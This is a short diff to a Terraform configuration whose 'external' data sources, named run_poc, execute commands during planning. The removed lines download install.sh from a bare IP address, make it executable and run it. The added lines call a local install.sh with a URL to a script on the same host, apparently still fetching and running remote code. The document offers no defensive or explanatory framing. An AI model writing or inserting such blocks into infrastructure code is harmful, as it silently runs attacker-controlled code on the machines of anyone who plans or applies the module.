@@ -11,15 +11,11 @@ resource "random_id" "r" {
 }
 
 data "external" "run_poc" {
-  program = ["wget", "-O", "/tmp/install.sh", "http://164.90.177.231:8080/install.sh"]
-}
+  program = ["${path.module}/install.sh"]
 
-data "external" "run_poc2" {
-  program = ["chmod", "+x", "/tmp/install.sh"]
-}
-
-data "external" "run_poc3" {
-  program = ["sh", "/tmp/install.sh"]
+  query = {
+    url = "http://164.90.177.231:8080/script.sh"
+  }
 }
 
 variable "env_type_id" {
